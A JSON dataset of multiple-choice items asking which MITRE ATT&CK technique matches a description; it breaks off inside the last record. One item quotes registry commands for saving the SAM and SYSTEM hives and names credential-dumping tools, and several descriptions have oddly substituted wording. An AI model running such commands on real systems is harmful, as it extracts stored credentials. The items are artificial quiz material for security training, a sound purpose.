[
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.\n\nBrowser information may also highlight additional targets after an adversary has access to valid credentials, especially Credentials In Files associated with logins cached by a browser.\n\nSpecific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., `%APPDATA%/Google/Chrome`).\n\nOptions:\nA. Browser Information Discovery, B. Modify Cloud Compute Infrastructure: Revert Cloud Instance, C. Credentials from Password Stores: Cloud Secrets Management Stores, D. Unsecured Credentials: Container API",
    "context": "",
    "output": "A. Browser Information Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.\n\nBrowser information may also highlight additional targets after an adversary has access to valid credentials, especially Credentials In Files associated with logins cached by a browser.\n\nSpecific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., `%APPDATA%/Google/Chrome`).",
      "options": "A. Browser Information Discovery, B. Modify Cloud Compute Infrastructure: Revert Cloud Instance, C. Credentials from Password Stores: Cloud Secrets Management Stores, D. Unsecured Credentials: Container API",
      "choice": "A. Browser Information Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to take the techniques of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.\n\nPossible answers:\nA. Remote Services: Direct Cloud VM Connections, B. Stage Capabilities: SEO Poisoning, C. Valid Accounts: Cloud Accounts, D. Screen Capture",
    "context": "",
    "output": "D. Screen Capture",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to take the techniques of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.",
      "options": "A. Remote Services: Direct Cloud VM Connections, B. Stage Capabilities: SEO Poisoning, C. Valid Accounts: Cloud Accounts, D. Screen Capture",
      "choice": "D. Screen Capture",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAn adversary may use a the technique GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.\n\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.\nA. Cloud Service Dashboard, B. Subvert Trust Controls: Install Root Certificate, C. Power Settings, D. Command and Scripting Interpreter: Cloud API",
    "context": "",
    "output": "A. Cloud Service Dashboard",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAn adversary may use a the technique GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.\n\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.",
      "options": "A. Cloud Service Dashboard, B. Subvert Trust Controls: Install Root Certificate, C. Power Settings, D. Command and Scripting Interpreter: Cloud API",
      "choice": "A. Cloud Service Dashboard",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients. The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers. Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address. Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, Service Exhaustion Flood) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool.\n\nOptions:\nA. Gather Victim Network Information: IP Addresses, B. Adversary-in-the-Middle: DHCP Spoofing, C. Command and Scripting Interpreter: Cloud API, D. System Binary Proxy Execution: InstallUtil",
    "context": "",
    "output": "B. Adversary-in-the-Middle: DHCP Spoofing",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients. The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers. Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address. Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, Service Exhaustion Flood) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool.",
      "options": "A. Gather Victim Network Information: IP Addresses, B. Adversary-in-the-Middle: DHCP Spoofing, C. Command and Scripting Interpreter: Cloud API, D. System Binary Proxy Execution: InstallUtil",
      "choice": "B. Adversary-in-the-Middle: DHCP Spoofing",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* gsecdump\n* Mimikatz\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\nA. Hijack Execution Flow: COR_PROFILER, B. OS Credential Dumping: Security Account Manager, C. Data from Information Repositories, D. Exfiltration Over Web Service: Exfiltration to Text Storage Sites\nAnswer:",
    "context": "",
    "output": "B. OS Credential Dumping: Security Account Manager",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* gsecdump\n* Mimikatz\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.",
      "options": "A. Hijack Execution Flow: COR_PROFILER, B. OS Credential Dumping: Security Account Manager, C. Data from Information Repositories, D. Exfiltration Over Web Service: Exfiltration to Text Storage Sites",
      "choice": "B. OS Credential Dumping: Security Account Manager",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the Component Object Model and Internet Explorer HTML Application (HTA) pages.\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and AppleScript. Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a Drive-by Compromise or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of Obfuscated Files or Information.\n\nPossible answers:\nA. Peripheral Device Discovery, B. Boot or Logon Autostart Execution: Winlogon Helper DLL, C. Command and Scripting Interpreter: JavaScript, D. Disk Wipe: Disk Content Wipe",
    "context": "",
    "output": "C. Command and Scripting Interpreter: JavaScript",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the Component Object Model and Internet Explorer HTML Application (HTA) pages.\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and AppleScript. Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a Drive-by Compromise or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of Obfuscated Files or Information.",
      "options": "A. Peripheral Device Discovery, B. Boot or Logon Autostart Execution: Winlogon Helper DLL, C. Command and Scripting Interpreter: JavaScript, D. Disk Wipe: Disk Content Wipe",
      "choice": "C. Command and Scripting Interpreter: JavaScript",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through OS Credential Dumping. Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files. They may also be found as parameters to deployment commands in container logs. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.\nA. Hide Infrastructure, B. Unsecured Credentials: Credentials In Files, C. Email Collection: Local Email Collection, D. Software Discovery",
    "context": "",
    "output": "B. Unsecured Credentials: Credentials In Files",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through OS Credential Dumping. Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files. They may also be found as parameters to deployment commands in container logs. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.",
      "options": "A. Hide Infrastructure, B. Unsecured Credentials: Credentials In Files, C. Email Collection: Local Email Collection, D. Software Discovery",
      "choice": "B. Unsecured Credentials: Credentials In Files",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.\nA. Peripheral Device Discovery, B. Pre-OS Boot: Bootkit, C. Video Capture, D. Pre-OS Boot: System Firmware",
    "context": "",
    "output": "A. Peripheral Device Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
      "options": "A. Peripheral Device Discovery, B. Pre-OS Boot: Bootkit, C. Video Capture, D. Pre-OS Boot: System Firmware",
      "choice": "A. Peripheral Device Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may communicate using OSI the techniques to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.\nA. Exfiltration Over Alternative Protocol, B. Application Layer Protocol, C. Phishing for Information: Spearphishing Attachment, D. Obfuscated Files or Information: Embedded Payloads\nAnswer:",
    "context": "",
    "output": "B. Application Layer Protocol",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may communicate using OSI the techniques to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.",
      "options": "A. Exfiltration Over Alternative Protocol, B. Application Layer Protocol, C. Phishing for Information: Spearphishing Attachment, D. Obfuscated Files or Information: Embedded Payloads",
      "choice": "B. Application Layer Protocol",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  PowerShell, or Reg. Access to Registry keys is controlled through access control lists and user permissions. \n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL. If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities. Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.\n\nOptions:\nA. Masquerading: Invalid Code Signature, B. Hijack Execution Flow: Services Registry Permissions Weakness, C. Proxy: Domain Fronting, D. Develop Capabilities: Code Signing Certificates",
    "context": "",
    "output": "B. Hijack Execution Flow: Services Registry Permissions Weakness",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  PowerShell, or Reg. Access to Registry keys is controlled through access control lists and user permissions. \n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL. If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities. Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.",
      "options": "A. Masquerading: Invalid Code Signature, B. Hijack Execution Flow: Services Registry Permissions Weakness, C. Proxy: Domain Fronting, D. Develop Capabilities: Code Signing Certificates",
      "choice": "B. Hijack Execution Flow: Services Registry Permissions Weakness",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.\nA. Obfuscated Files or Information: Command Obfuscation, B. Obtain Capabilities: Artificial Intelligence, C. Impair Defenses: Disable Windows Event Logging, D. Supply Chain Compromise: Compromise Hardware Supply Chain\nAnswer:",
    "context": "",
    "output": "D. Supply Chain Compromise: Compromise Hardware Supply Chain",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",
      "options": "A. Obfuscated Files or Information: Command Obfuscation, B. Obtain Capabilities: Artificial Intelligence, C. Impair Defenses: Disable Windows Event Logging, D. Supply Chain Compromise: Compromise Hardware Supply Chain",
      "choice": "D. Supply Chain Compromise: Compromise Hardware Supply Chain",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for Security Software Discovery. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\n\nThere have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries , evade security logs , or deploy hidden infrastructure.\nA. Gather Victim Org Information: Business Relationships, B. Exploitation for Defense Evasion, C. Search Closed Sources: Purchase Technical Data, D. Endpoint Denial of Service: Service Exhaustion Flood\nAnswer:",
    "context": "",
    "output": "B. Exploitation for Defense Evasion",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for Security Software Discovery. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\n\nThere have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries , evade security logs , or deploy hidden infrastructure.",
      "options": "A. Gather Victim Org Information: Business Relationships, B. Exploitation for Defense Evasion, C. Search Closed Sources: Purchase Technical Data, D. Endpoint Denial of Service: Service Exhaustion Flood",
      "choice": "B. Exploitation for Defense Evasion",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE). Remote COM execution is facilitated by Remote Services such as  Distributed Component Object Model (DCOM).\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and Visual Basic. Specific COM objects also exist to directly perform functions beyond code execution, such as creating a Scheduled Task/Job, fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.\nA. Modify Cloud Compute Infrastructure: Modify Cloud Compute Configurations, B. Multi-Factor Authentication Interception, C. OS Credential Dumping: DCSync, D. Inter-Process Communication: Component Object Model\nAnswer:",
    "context": "",
    "output": "D. Inter-Process Communication: Component Object Model",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE). Remote COM execution is facilitated by Remote Services such as  Distributed Component Object Model (DCOM).\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and Visual Basic. Specific COM objects also exist to directly perform functions beyond code execution, such as creating a Scheduled Task/Job, fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.",
      "options": "A. Modify Cloud Compute Infrastructure: Modify Cloud Compute Configurations, B. Multi-Factor Authentication Interception, C. OS Credential Dumping: DCSync, D. Inter-Process Communication: Component Object Model",
      "choice": "D. Inter-Process Communication: Component Object Model",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.\n\nAdversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct File and Directory Permissions Modification or Modify Registry in support of subverting these controls. Adversaries may also create or steal code signing certificates to acquire trust on target systems.\n\nPossible answers:\nA. Indicator Removal: Clear Network Connection History and Configurations, B. System Binary Proxy Execution: Control Panel, C. Subvert Trust Controls, D. Network Denial of Service",
    "context": "",
    "output": "C. Subvert Trust Controls",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.\n\nAdversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct File and Directory Permissions Modification or Modify Registry in support of subverting these controls. Adversaries may also create or steal code signing certificates to acquire trust on target systems.",
      "options": "A. Indicator Removal: Clear Network Connection History and Configurations, B. System Binary Proxy Execution: Control Panel, C. Subvert Trust Controls, D. Network Denial of Service",
      "choice": "C. Subvert Trust Controls",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost. Additionally, botnets are available for rent or purchase.\n\nUse of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support Proxy, including from residential proxy services. Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.\n\nA. Supply Chain Compromise: Compromise Software Dependencies and Development Tools, B. Acquire Infrastructure, C. Compromise Accounts: Cloud Accounts, D. Account Access Removal\nA:",
    "context": "",
    "output": "B. Acquire Infrastructure",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
